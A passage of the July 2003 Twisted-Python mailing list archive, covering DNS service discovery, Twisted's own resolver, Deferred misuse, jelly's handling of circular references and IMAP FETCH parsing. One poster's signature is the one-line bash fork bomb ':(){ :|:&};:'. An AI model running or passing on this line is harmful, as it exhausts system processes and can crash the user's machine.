  'serviceInstance': "Tim Allen's Web Site._http._tcp.local",
  'settings': {'path': '/~st/'}}
{'instance': u'Grundoon',
  'servers': [('grundoon.local', 80)],
  'serviceInstance': 'Grundoon._http._tcp.local',
  'settings': {}}

Note that my laptop's name is 'grundoon' and my login name is 'st'.

The only obvious wart in the code as it stands is that the spec says  
that the 'instance' name can contain any Unicode character, while  
Twisted's DNS code seems to choke on DNS name components that contain  
periods. For the record, the DNS-SD spec says that embedded periods  
should be written '\.', and backslashes obviously '\\'.

It occurs to me now that perhaps I should have written a patch for the  
Twisted DNS code and submitted it along with this message, but it's  
getting late and I wish to get some sleep before I go to work tomorrow.  
:)

-------------- next part --------------
A non-text attachment was scrubbed...
Name: dns_sd.py
Type: application/octet-stream
Size: 6757 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030707/26bfc172/attachment-0004.obj>
-------------- next part --------------
A non-text attachment was scrubbed...
Name: dns_sd_client.py
Type: application/octet-stream
Size: 598 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030707/26bfc172/attachment-0005.obj>

From mmoellenbeck at plus.de  Mon Jul  7 07:57:28 2003
From: mmoellenbeck at plus.de (mmoellenbeck at plus.de)
Date: Mon, 7 Jul 2003 15:57:28 +0200
Subject: [Twisted-Python] Sample for using select/option with t.w.w.form.FormProcessor
Message-ID: <OF3DF17A7B.F75AB5E6-ONC1256D5C.004C3C60@uz.tengelmann.de>

hi,

has anybody an example for using select/option with 
t.w.w.form.FormProcessor?

thanks and regarts

Martin Moellenbeck 
-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030707/770d859b/attachment.html>

From justinjohnson at fastmail.fm  Mon Jul  7 13:13:33 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Mon, 07 Jul 2003 13:13:33 -0600
Subject: [Twisted-Python] the new cred and xmlrpc
Message-ID: <20030707191333.7021F32D0B@www.fastmail.fm>

Hi,

Would someone mind helping me out with the new cred?  I'm looking at
webhappyrealm.py and trying to get a feel for how this works, but I'm not
sure how to use it for my twisted.web.xmlrpc.XMLRPC service.

Thanks.
-Justin



From 2002 at weholt.org  Mon Jul  7 15:00:21 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Mon, 7 Jul 2003 23:00:21 +0200
Subject: [Twisted-Python] Patch for twisted.web.soap
Message-ID: <003a01c344ca$c7874740$0401a8c0@razor>

To get twisted.web.soap working with SOAPpy 0.10.1 you have to change the
line

import SOAP

to

from SOAPpy import SOAP

in twisted.web.soap.

Perhaps get that into the CVS-version? I think my fix is also just a quick
hack, but the CVS-version should be updated to support the new import
syntax.

Best regards,
Thomas Weholt




From 2002 at weholt.org  Mon Jul  7 16:30:43 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Tue, 8 Jul 2003 00:30:43 +0200
Subject: [Twisted-Python] Problems with deferred
Message-ID: <005201c344d7$68346ef0$0401a8c0@razor>

Hi,

I got a tip earlier from this list on how to implement a scheduled task, or
in my case several task. I want my ApplicationService-object to hold a list
of tasks, looking somewhat like the ones subclassing the task-class in the
code below, where a method called Action is called on a given interval. I
want users to be able to just subclass my task-class and override the
action-method and then the application will create a list of instances of
these tasks, call their start method and from there on their action method
will be called over and over on the intervall specified in their
refreshInterval-attribute given at creation.

Does that makes sense? In my code only Task1.action is called, and
Task2.action is called just before the thing exits. Why?

Any hints?

from twisted.internet.app import Application, ApplicationService
from twisted.internet import defer
from twisted.internet import reactor
from twisted.python import log

class task:

    def __init__(self, service, refreshInterval=5):
        self.service = service
        self.refreshInterval = refreshInterval

    def start(self):
        reactor.callLater(self.refreshInterval, self.execute)

    def action(self):
        "Override this!"
        print "action called"

    def execute(self):
        d = defer.Deferred()
        reactor.callLater(0, self.action)

        # Log any errors in downloading or processing
        d.addErrback(log.err)

        # Reschedule this function
        d.addBoth(reactor.callLater, self.refreshInterval, self.execute)

class task1(task):
    def action(self):
        print "Task 1 called"

class task2(task):
    def action(self):
        print "Task 2 called"

class testservice(ApplicationService):

    def __init__(self, application):
        self.application = application
        self.tasks = [task1(self), task2(self)]

    def startService(self):
        print "Starting services"
        for task in self.tasks:
            task.start()


    def stopService(self):
        print "Stopping services"

app = Application('test app')
srv = testservice(app)
app.run()


Best regards,
Thomas W




From andrew-twisted at puzzling.org  Mon Jul  7 19:46:39 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 8 Jul 2003 11:46:39 +1000
Subject: [Twisted-Python] Patch for twisted.web.soap
In-Reply-To: <003a01c344ca$c7874740$0401a8c0@razor>
References: <003a01c344ca$c7874740$0401a8c0@razor>
Message-ID: <20030708014639.GA16393@frobozz>

On Mon, Jul 07, 2003 at 11:00:21PM +0200, Thomas Weholt wrote:
> To get twisted.web.soap working with SOAPpy 0.10.1 you have to change the
> line
[...]
> 
> Perhaps get that into the CVS-version? I think my fix is also just a quick
> hack, but the CVS-version should be updated to support the new import
> syntax.

Itamar is a couple of days ahead of you:
    http://twistedmatrix.com/users/jh.twistd/viewcvs/cgi/viewcvs.cgi/twisted/web/soap.py?rev=1.3&content-type=text/vnd.viewcvs-markup&cvsroot=Twisted

-Andrew.




From andrew-twisted at puzzling.org  Mon Jul  7 19:54:22 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 8 Jul 2003 11:54:22 +1000
Subject: [Twisted-Python] Problems with deferred
In-Reply-To: <005201c344d7$68346ef0$0401a8c0@razor>
References: <005201c344d7$68346ef0$0401a8c0@razor>
Message-ID: <20030708015422.GB16393@frobozz>

On Tue, Jul 08, 2003 at 12:30:43AM +0200, Thomas Weholt wrote:
> 
>     def execute(self):
>         d = defer.Deferred()
>         reactor.callLater(0, self.action)
> 
>         # Log any errors in downloading or processing
>         d.addErrback(log.err)
> 
>         # Reschedule this function
>         d.addBoth(reactor.callLater, self.refreshInterval, self.execute)

This function is obviously wrong.  It creates a Deferred, but there is no
reference to it outside of this function.  So there is nowhere else in your
code that could get an opportunity to call d.callback or d.errback, and this
function never calls that, thus this Deferred will never fire.  So this
function is equivalent to:

    def execute(self):
        reactor.callLater(0, action)

I'm guessing this isn't what you meant :)

I think you've possibly confused reactor.callLater with
twisted.internet.threads.deferToThread?

-Andrew.




From tv at twistedmatrix.com  Tue Jul  8 01:49:40 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Tue, 8 Jul 2003 10:49:40 +0300
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com>
References: <16136.11049.63479.337891@frank.xprtcc.com> <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com>
Message-ID: <20030708074940.GA6207@lapdog>

On Mon, Jul 07, 2003 at 11:38:38PM +1000, Tim Allen wrote:
> DNS-SD (DNS based Service Discovery) is the easy part - it's just a  
> standard way of organising DNS records such that a set of DNS queries  
> can create a useful list of things to connect to. 'Implementing' DNS-SD  
> support is not at all difficult, providing there exists an API to  
> request PTR and SRV records, and providing you can add them to your DNS  
> server.

	That exists, start reading from
	twisted.internet.utils.SRVConnector.

> I haven't read the mDNS spec in detail, but the interaction between  
> Twisted and the operating system's resolver seems complex. It'd be nice  
> if Python had a DNS API more extensive than gethostbyname(), but it  
> doesn't.

	That's why Twisted (and many other serious projects) are totally
	ignoring the libc resolver. The API is just too limited.

	Let me say that again. Twisted implements its own resolver that
	talks UDP itself. gethostbyname() is just not usable.

-- 
:(){ :|:&};:



From screwtape at froup.com  Tue Jul  8 04:38:18 2003
From: screwtape at froup.com (screwtape at froup.com)
Date: Tue, 8 Jul 2003 20:38:18 +1000
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <20030708074940.GA6207@lapdog>
References: <16136.11049.63479.337891@frank.xprtcc.com> <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com> <20030708074940.GA6207@lapdog>
Message-ID: <20030708103817.GA17209@ferd2.thristian.org>

On Tue, Jul 08, 2003 at 10:49:40AM +0300, Tommi Virtanen wrote:
> On Mon, Jul 07, 2003 at 11:38:38PM +1000, Tim Allen wrote:
> > DNS-SD (DNS based Service Discovery) is the easy part - it's just a  
> > standard way of organising DNS records such that a set of DNS queries  
> > can create a useful list of things to connect to. 'Implementing' DNS-SD  
> > support is not at all difficult, providing there exists an API to  
> > request PTR and SRV records, and providing you can add them to your DNS  
> > server.
> 
> 	That exists, start reading from
> 	twisted.internet.utils.SRVConnector.

I see. Thanks!

> > I haven't read the mDNS spec in detail, but the interaction between  
> > Twisted and the operating system's resolver seems complex. It'd be nice  
> > if Python had a DNS API more extensive than gethostbyname(), but it  
> > doesn't.
> 
> 	That's why Twisted (and many other serious projects) are totally
> 	ignoring the libc resolver. The API is just too limited.
> 
> 	Let me say that again. Twisted implements its own resolver that
> 	talks UDP itself. gethostbyname() is just not usable.

Hm.. ISTR someone saying a while ago that Twisted should use the
operating system's resolver, since it might have a far more complex
configuration than Twisted can read from /etc/resolv.conf - indeed,
here on OS X, /etc/resolv.conf is a just a file written to keep legacy
Unix apps happy - the real resolver seems to have something to do with
this strange /etc/resolver directory I've just discovered.

Anyway, I just looked up ReactorBase._internalResolve() in
twisted.internet.base, and this is what it says:

    def _internalResolve(self, name, timeout):
        try:
            address = socket.gethostbyname(name)
        except socket.error:
            return defer.fail(failure.Failure(error.DNSLookupError("address not found")))
        else:
            return defer.succeed(address)

Granted, ReactorBase.resolve() doesn't call _internalResolve if a new resolver
has been installed (ReactorBase.installResolver()), but a quick grep
of the Twisted source shows no mention of that method apart from its
definition (in ReactorBase and IReactorPluggableResolver).

-- 
 ___________ ____________________________
| Screwtape | Reply-To: munged on Usenet |________ ______ ____ __ _  _   _
|
| "Triangle?" "Yes?" "Where am I?" "Down" "Thanks" "You're welcome" T&R 20030614
|



From andrew-twisted at puzzling.org  Tue Jul  8 04:55:01 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 8 Jul 2003 20:55:01 +1000
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <20030708103817.GA17209@ferd2.thristian.org>
References: <16136.11049.63479.337891@frank.xprtcc.com> <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com> <20030708074940.GA6207@lapdog> <20030708103817.GA17209@ferd2.thristian.org>
Message-ID: <20030708105501.GA17301@frobozz>

On Tue, Jul 08, 2003 at 08:38:18PM +1000, screwtape at froup.com wrote:
[...]
> Granted, ReactorBase.resolve() doesn't call _internalResolve if a new resolver
> has been installed (ReactorBase.installResolver()), but a quick grep
> of the Twisted source shows no mention of that method apart from its
> definition (in ReactorBase and IReactorPluggableResolver).

At a glance, it looks like you could do this, though:
    from twisted.names import client
    from twisted.internet import reactor

    reactor.installResolver(client.theResolver)

-Andrew.




From illumen at yahoo.com  Tue Jul  8 05:08:20 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Tue, 08 Jul 2003 21:08:20 +1000
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <20030708074940.GA6207@lapdog>
References: <16136.11049.63479.337891@frank.xprtcc.com> <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com> <20030708074940.GA6207@lapdog>
Message-ID: <3F0AA624.2050604@yahoo.com>

Tommi Virtanen wrote:

>On Mon, Jul 07, 2003 at 11:38:38PM +1000, Tim Allen wrote:
>  
>
>>DNS-SD (DNS based Service Discovery) is the easy part - it's just a  
>>standard way of organising DNS records such that a set of DNS queries  
>>can create a useful list of things to connect to. 'Implementing' DNS-SD  
>>support is not at all difficult, providing there exists an API to  
>>request PTR and SRV records, and providing you can add them to your DNS  
>>server.
>>    
>>
>
>	That exists, start reading from
>	twisted.internet.utils.SRVConnector.
>
>  
>
>>I haven't read the mDNS spec in detail, but the interaction between  
>>Twisted and the operating system's resolver seems complex. It'd be nice  
>>if Python had a DNS API more extensive than gethostbyname(), but it  
>>doesn't.
>>    
>>
>
>	That's why Twisted (and many other serious projects) are totally
>	ignoring the libc resolver. The API is just too limited.
>
>	Let me say that again. Twisted implements its own resolver that
>	talks UDP itself. gethostbyname() is just not usable.
>
>  
>
This is quite a supprising behaviour.  It should be printed in big 
flashing lights :)

There are many valid reasons to use the standard method.





From don at motorola.com  Tue Jul  8 16:01:07 2003
From: don at motorola.com (Don Hiatt)
Date: Tue, 8 Jul 2003 17:01:07 -0500
Subject: [Twisted-Python] simultaneously acting as a server and a client
In-Reply-To: <200307031611.h63GB3C7018183@ratthing-b246.strakt.com>
Message-ID: <FPEBLIAFGDEEOHHAGOKBIEPPCBAA.don@motorola.com>

Howdy twisters, :)

I implemented a client using the ClientFactory which
connects to a server and sends requests and receives 
replies. I currently have a simple command line interface
but would like to replace it with a webserver. Basically
what I would like to do is, start the webserver, connect
to another server, and when the user requests a specific
url, I would use the clientfactory to send the request
and then render the response in html.

Anyone have any suggestions on how I might go about doing
this? 

Thanks for you time.

Cheers,

don




From warner at lothar.com  Tue Jul  8 21:29:08 2003
From: warner at lothar.com (Brian Warner)
Date: Tue, 08 Jul 2003 20:29:08 -0700 (PDT)
Subject: [Twisted-Python] Controlling the classes being Jellied
References: <JAEDJDIBADCJHPFLNEDFIEEOCAAA.pb_twisted@olga.mine.nu>
Message-ID: <20030708.202908.59484738.warner@lothar.com>

"Patrik Blommaskog" <pb_twisted at olga.mine.nu> writes:

> I am having some problems finding my way around the API docs. The
> Copyable.getTypeToCopy() I found eventually, but I still can't find
> pb.setUnjellyableForClass in the docs even when I know what to look for.

You've probably already found it by now, but for the benefit of archive
readers: setUnjellyableForClass() is actually defined in the
twisted.spread.jelly module. Several PB things are defined in one of
(banana.py, jelly.py, flavors.py, spread.py) and then imported into the
others. I usually end up doing the "big grep" to find the actual definition:

 find ~/stuff/Twisted -type f |xargs grep setUnjellyableForClass |grep def

Some of it is for historical reasons, some of it has to do with the most
appropriate place for the implementation not always being the most
convenient place for use.

In general, banana.py is the lowest level token-to-bytestream layer,
jelly.py is the object serialization that sits above it. spread.py is where
the Broker class is implemented (as well as utility functions like
pb.Connect and pb.getObjectAt), and flavors.py covers the Referenceable /
Copyable / Cacheable subclasses.

cheers,
 -Brian



From ta-meyer at ihug.co.nz  Tue Jul  8 22:47:57 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Wed, 9 Jul 2003 16:47:57 +1200
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F13023945D7@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F130212AADD@its-xchg4.massey.ac.nz>

[Tony]
> > For example, this command:
>     0003 FETCH 1 BODY.PEEK[HEADER.FIELDS (References X-Ref)] UID
[Jp]
> Ideally, I'd like to see this parsed into a structure 
> resembling this:
> 
>     [Header(peek=1, name=1, value=1, ['References', 'X-Ref']), UID()]
> 
> Would you be interested in patching the fetch methods to 
> generate a structure like the one I described above?

This command now becomes:
    ["BODY(PEEK=1, HEADER=1, FIELDS=1, fielditems=['References', 'X-Ref'])",
'UID()']

Is this suitable?  I presume(d) from the structure that you suggested that
one way of handling this would be to then exec each element (having a
BODY(), UID function, and so on).

If there are problems with this, I'm happy to make changes.  I wrote it
against the RFC, so there may be things that need to be changed if there are
clients that do things illegally that are meant to be supported.  It also
_only_ supports rfc2060, not any extra additions, although if they are
simple ones or macros then it would be easy to simply append them to the
appropriate list.

Anyway, here it is, let me know what you think.

=Tony Meyer
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: fetch_att.py
URL: </pipermail/twisted-python/attachments/20030709/4fea0991/attachment.ksh>

From ta-meyer at ihug.co.nz  Tue Jul  8 23:27:00 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Wed, 9 Jul 2003 17:27:00 +1200
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F13023945D7@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F130212AAE1@its-xchg4.massey.ac.nz>

>   Ideally, I'd like to see this parsed into a structure 
> resembling this:
> 
>     [Header(peek=1, name=1, value=1, ['References', 'X-Ref']), UID()]
[...]
>   Would you be interested in patching the fetch methods to 
> generate a structure like the one I described above?

Further from my own message, attached is a slightly improved version that
expands the macros so that the user doesn't need to know about them.

=Tony Meyer
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: fetch_att.py
URL: </pipermail/twisted-python/attachments/20030709/0e58179e/attachment.ksh>

From ta-meyer at ihug.co.nz  Wed Jul  9 00:17:19 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Wed, 9 Jul 2003 18:17:19 +1200
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F130256546D@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F130212AAE3@its-xchg4.massey.ac.nz>

> Further from my own message, attached is a slightly improved 
> version that expands the macros so that the user doesn't need 
> to know about them.

Third time lucky!  Both snippets of code I posted need one little change -
the return from fetch-att should be "return (query, '')" rather than simply
"return query" (pays to check the code first!).

The flaw as it stands, of course, is that whoever receives these atts has to
put them back together as they were so that the reply is correctly
formatted.  I suppose the correct action there is to also change the
__cbFetch function, but I'll leave this until I get some confirmation that
this is the right sort of thing.

=Tony Meyer




From warner at lothar.com  Wed Jul  9 02:51:49 2003
From: warner at lothar.com (Brian Warner)
Date: Wed, 09 Jul 2003 01:51:49 -0700 (PDT)
Subject: [LONG] Re: [Twisted-Python] Why do I get a _Dereference instance?
References: <JAEDJDIBADCJHPFLNEDFOEFNCAAA.pb_twisted@olga.mine.nu>
Message-ID: <20030709.015149.85705814.warner@lothar.com>

"Patrik Blommaskog" <pb_twisted at olga.mine.nu> writes:

> 	def setCopyableState(self, state):
> 	    self.__dict__.update(state)
> 
> gives the strange behavior

> While:
> 	def setCopyableState(self, state):
> 	    self.__dict__ = state
> 
> Gives the expected

> This feels like the twilight zone. Can somebody please tell me what is going
> on? I have attached the code for my experiment.

You're seeing an unfortunate artifact that results from the way circular
references are handled in the standard Jelly code. The problem has been
addressed somewhat in newjelly, but there are deeper issues which mean the
problem may not be possible to fix completely.

The following is a longish discussion of how jelly works and why this is
mostly unavoidable, followed by some design possibilities for other ways to
deal with it (newbanana enthusiasts are asked to read and comment upon the
last bit).


1: Mutable Containers

To start with, think about how a self-referential list must be unserialized.
This is a "mutable container", a category of objects which also includes
dictionaries. Something like:
  
  >>> a = [1,2]
  >>> a.append(a)
  >>> a.append(4)
  >>> a
  [1, 2, [...], 4]

When this is serialized, jelly (just like pickle) gets to the third element
and recognizes that this is something it has serialized before (or at least
it has started the serialization process). Rather than engage in pointless
infinite recursion, it inserts a 'dereference' marker that tells the
unserializer to insert a reference to something it already knows about.

(jelly, newjelly, and pickle all handle this slightly differently. oldjelly
puts explicit 'reference' markers on things that will need to be used later,
while newjelly uses an implicit reference counter that is incremented by
one. I use newjelly examples here because they are slightly easier to
follow.. oldjelly behaves pretty much the same way)

The resulting sexp stream (for newjelly) is:
  
  >>> from twisted.spread.newjelly import jelly
  >>> jelly(a)
  ['list', 1, 2, ['dereference', 0], 4]

The unserialization process handles one token at a time. It sees the "list"
token and creates an empty list, and stashes a reference in the "dereference
table" at index 0. It sees the number tokens and appends "1" and "2" to that
previously-empty list. Then it gets the "dereference" marker, looks up the
index in the dereference table, and ends up appending that list reference to
the list. Then it sees the "4" and appends a number, then it sees the
closing bracket and finishes up. This technique works for
arbitrarily-deeply-nested self-referential mutable container objects.

Note that the list is not really "complete" until the closing bracket, but
it needs to be referenceable before that point. Because we can create empty
lists and add things to them later, the list is referenceable starting with
the open bracket, and complete at the closing bracket.


2: Immutable Containers

Now think about a somewhat self-referential tuple. This is a "immutable
container". Of course it can't be directly self-referential: the cycle (in
graph-theory terms) must pass through a mutable container at some point,
otherwise the object could never be constructed in the first place.
  
  >>> b = [1,2]
  >>> c = (b,)
  >>> b.append(c)
  >>> c
  ([1, 2, ([...],)],)

This is serialized with similar dereference markers:

  >>> jelly(c)
  ['tuple', ['list', 1, 2, ['dereference', 0]]]

The difference this time is the immutable tuple (which needs to be
referenced later). It is not possible to create an empty tuple and add its
contents later. It is "referenceable" and "complete" at the same time,
unlike the list object.

To deal with this, we need a placeholder object. In jelly this is a
"_Tuple", which derives from twisted.persisted.crefutil.NotKnown . It acts
like a list while we add contents, but if we ever add the _Tuple to another
collection (like a dict or a list), the _Tuple remembers the collection
object and index to which it was added. When the closing bracket is
received, the _Tuple turns its list into a real tuple (making it "complete"
and "referenceable"), then walks through all the places that point to it and
fix them up. It does this by replacing the old _Tuple reference with a
reference to the new, complete tuple object. If the container that needed to
be fixed up is itself a _Tuple (or other NotKnown subclass), it might now be
complete, so it is given a chance to fix up *its* references, etc.

Cycles in the object graph are thus resolved in a chain, starting with the
node closest to the root object (the original thing passed to jelly()) and
propogating outwards to the deepest as-yet-unresolved container.

The salient points are: tuples and other "immutable containers" (which
currently includes bound instance methods) cannot be referenced until they
are complete, which requires all of their contents to be referenceable.
Placeholder objects and a post-completion fix-up step are used to deal with
this frustrating property.


3: Class Instances

Now consider regular instance objects, which can be described by a fully
qualified class name and a state dictionary. Clearly they are mutable
containers: you can trivially create cycles of nothing but instances:

  >>> class A: pass
  ... 
  >>> a1 = A(); a2 = A()
  >>> a1.a2 = a2; a2.a1 = a1
  >>> a1
  <__main__.A instance at 0x81abea4>
  >>> jelly(a1)
  ['__main__.A', ['dictionary', ['a2', ['__main__.A', ['dictionary', ['a1', ['dereference', 0]]]]]]]

The particular problem you're seeing is a misbehavior in oldjelly that was
addressed in newjelly. Oldjelly uses explicit reference tokens to mark
things that will be pointed to by dereference tokens later. The syntax of
those reference tokens is:

 ['reference', number, [thing being referenced]]

The oldjelly serialization of that pair of objects looks like this:
  
  >>> from twisted.spread.jelly import jelly as oldjelly
  >>> oldjelly(a1)
  ['reference', 1, ['__main__.A', ['dictionary', ['a2', ['__main__.A', ['dictionary', ['a1', ['dereference', 1]]]]]]]]

When oldjelly sees the 'reference' tag, it unserializes the "thing being
referenced", then stuffs a reference to it in the table. While that
unserialization is taking place (when the stack of things being unserialized
is actually: (reference 1), (instance a1), (a1.__dict__), (key 'a2'),
(instance a2), (a2.__dict__), (key 'a1')), the unjellying code hits the
"dereference 1" marker. Now, that reference hasn't been created yet: it
won't be until the enclosing object is finished. Oldjelly deals with this
using a _Deference object, which is another NotKnown subclass like _Tuple.
When the object is finally available, the _Dereference walks through the
places that point to it (in this case, a2.a1) and fix them up to point to
the correct object.

Until that point, a2.a1 is a _Dereference object. After the object is
complete, it is the correct A instance.

To perform that fixup, the _Dereference knows the dictionary it was added
to. Of course, it doesn't know about any *other* dictionaries that the
_Dereference might have been copied into, such as the one you used here:

> 	def setCopyableState(self, state):
> 	    self.__dict__.update(state)

The original 'state' dictionary is fixed-up with the correct instance
reference, but the independent __dict__ is not, so you wind up seeing the
_Dereference object that should have been hidden.


Newjelly deals with this differently, but is vulnerable to a similar
problem.

In newjelly, there are no explicit 'reference' tags. Instead, every sexp
that creates a new container object will increment the implicit reference
number. We mainly did this to remove the overhead of those reference tags,
both space (consumed in the bytestream), and computation (spent trying to
decide whether the object was going to be referenced more than once before
including the reference tag). It was far easier to simply track references
to *everything*, on both sides of the wire.

An important side-effect was that dereference tags will now *always* have a
matching reference, which is inserted into the reference table as soon as
the opening bracket is processed. The new unjelly_dereference() code
eliminated _Dereference altogether.

The (incomplete) instance object is referenceable as soon as the opening
bracket has been processed. The same is true for the state dictionary. This
means that the state handed to the .unjellyFor() method (and therefore to
.setCopyableState()) will reference the correct (although incomplete)
instance objects. No fixups are necessary, so there isn't a chance to fix-up
the wrong dictionary if "self.__dict__.update(state)" is used.

As a result, this pair of objects, when transported by newjelly, should
arrive without weird _Dereference artifacts, fixing your immediate problem.


4: the Remaining Problem

Newjelly is still vulnerable to a similar problem that results when an
immutable container (which cannot be fully resolved when the instance is
complete) is part of the instance's state:
  
  >>> a = A()
  >>> t = (1,2,a,4)
  >>> a.t = t
  >>> jelly(t)
  ['tuple', 1, 2, ['__main__.A', ['dictionary', ['t', ['dereference', 0]]]], 4]

Here, the tuple cannot be created until the '4' has been processed, so it is
neither complete nor referenceable when the instance's state is being
created. As a result, that state will have a _Tuple object that will
eventually be replaced by the real tuple. This means that the _Tuple needs
to remember that collection object "a", key "t" (a.t) needs to be fixed up
when the _Tuple is resolved. As before, if the _Tuple reference is copied
into a different dictionary, this fix-up will miss the real target, and the
instance will be left with a spurious _Tuple instance.

So, even though newjelly fixes the "instance.foo = instance" problem, it is
still vulnerable to certain "instance.foo = tuple" problems. Of course, this
is only when you use "self.__dict__.update(state)", so the simplest answer
is to just not do that :).

The more fundamental problem here is in presenting a coherent object graph
to the functions that are involved in creating that object graph. When
.setCopyableState() is called, the state dictionary may contain unresolved
references, and it may contain references to objects that are not yet
complete (other instances which have not yet had their own .setCopyableState
called). This puts a restriction upon those methods: they may not be able to
use all of their own state, or look inside related objects, or call methods
on related objects.


5: Possibilities  (newbanana people wake up)

I think this is a Hard Problem, and it isn't generally possible to figure
out a "correct" order in which to run these functions. It is very much like
running finalization routines during object destruction. It may be possible
to implement phases of deserialization.. .setCopyableState() could be run as
soon as the state dictionary is full of referenceable objects (putting it
off until all tuples were created, for example), and then call some other
method after all the objects are complete. Perhaps having a more uniform
scheme for indicating "incomplete" objects would help, one where instances
could register callbacks to be run after a certain list of other objects are
complete. The unserializer would then have to evaluate the callback requests
and come up with a legal sequence in which they could be executed, a
potentially impossible task if there are cycles in the dependency graph.

Some smaller-scale solutions might be worth exploring:

 Instead of things like _Tuple just storing a (collection,key) pair and
 updating that reference blindly, perhaps they should call a
 .resolvedReference(key, value) method. This would give the instance a
 chance to run some code and do something useful with the newly available
 data.

 gc.get_referrers() could be used to find the places which point to the
 _Tuple, then any which were instances could have a .resolvedReference
 method called (and any which were lists/dicts could be searched for the
 places that use the _Tuple, and then updated in place). This would probably
 fix the __dict__.update problem, at the expense of performance
 (get_referrers is very slow) and the inclusion of an uncomfortable amount
 of magic.

 The newbanana scheme (sandbox/warner/slicer.py) uses Deferreds as
 placeholder objects. Arbitrary callbacks can be added, which might make it
 easier to handle the "self.__dict__.update(state)" pattern.



Anyway, that was probably a much longer answer than you were looking for,
but I thought it important to explain the larger problem (which remains
unfixed) rather than simply saying "it's been fixed in newjelly", or "don't
use __dict__.update".

hope that helps more than it confuses,
 -Brian



From exarkun at twistedmatrix.com  Wed Jul  9 04:04:48 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Wed, 9 Jul 2003 06:04:48 -0400
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F130212AADD@its-xchg4.massey.ac.nz>
References: <1ED4ECF91CDED24C8D012BCF2B034F13023945D7@its-xchg4.massey.ac.nz> <1ED4ECF91CDED24C8D012BCF2B034F130212AADD@its-xchg4.massey.ac.nz>
Message-ID: <20030709100438.GA7562@intarweb.us>

On Wed, Jul 09, 2003 at 04:47:57PM +1200, Tony Meyer wrote:
> [Tony]
> > > For example, this command:
> >     0003 FETCH 1 BODY.PEEK[HEADER.FIELDS (References X-Ref)] UID
> [Jp]
> > Ideally, I'd like to see this parsed into a structure 
> > resembling this:
> > 
> >     [Header(peek=1, name=1, value=1, ['References', 'X-Ref']), UID()]
> > 
> > Would you be interested in patching the fetch methods to 
> > generate a structure like the one I described above?
> 
> This command now becomes:
>     ["BODY(PEEK=1, HEADER=1, FIELDS=1, fielditems=['References', 'X-Ref'])",
> 'UID()']
> 
> Is this suitable?  I presume(d) from the structure that you suggested that
> one way of handling this would be to then exec each element (having a
> BODY(), UID function, and so on).

  Eeep :o  This isn't quite what I was going for... The exec stage is a big
no-no from my point of view.  I'd rather have Body be a class, with peek,
fields, etc as boolean attributes on its instances.  This avoids having to
build up strings in the protocol code, and avoids forcing client code to
turn it back into something easily parsed.  I guess I should give a couple
examples.

  The body class might be defined something like this (and instantiated as
above, with proper case normalization and removal of the quotes making the
whole thing a string):

    class Body:
        name = 'body'
	def __init__(self, peek=False, header=False, fields=False, **kwargs):
            self.peek, self.header, self.fields = peek, header, fields
            self.__dict__.update(kwargs)

        def __str__(self):
            base = 'BODY'
            if self.peek:
                base = 'BODY.PEEK'
            opt = ''
            if self.header:
                if self.fields:
                    opt = '[HEADER.FIELDS %s]' % ' '.join(self.fielditems)
                else:
                    opt = '[HEADER %s]' % ' '.join(self.fielditems)
            elif # ... something else
                ...
            return '%s%s' % (base, opt)

  Client code could expect to use it like this:

    def fetch(self, msgs, queryParts, uid):
        r = {}
        for q in queryParts:
            r[q] = getattr(self, 'fetch_' + q.name)(msgs, q, uid)

    def fetch_body(self, msgs, query, uid):
        if not query.peek:
            # mark specified messages as seen
        if query.header:
            if query.fields:
                ...

  There's a clear problem with the way Body.__str__ is implemented (no
quoting -- but maybe this could be fixed with a DB-API-style quoting
tactic), and obviously large parts of the implementation are missing, but I
hope this gets my idea across a little more clearly.  I am dead tired at the
moment, I just wanted to respond quickly to clear up the point of strings vs
classes.  If I still haven't succeeded in conveying all my thoughts clearly,
please let me know and I'll try again :)

> 
> If there are problems with this, I'm happy to make changes.  I wrote it
> against the RFC, so there may be things that need to be changed if there are
> clients that do things illegally that are meant to be supported.  It also
> _only_ supports rfc2060, not any extra additions, although if they are
> simple ones or macros then it would be easy to simply append them to the
> appropriate list.

  This sounds fine.  I do like that it moves the macro processing out of the
mailbox and into the protocol code.

> 
> Anyway, here it is, let me know what you think.

  The only other thing I wanted to mention was that scary regular
expression.  I haven't even attempted to decipher it yet, but I was curious
if you pulled it out of or based it off of one of the RFCs, or if you came
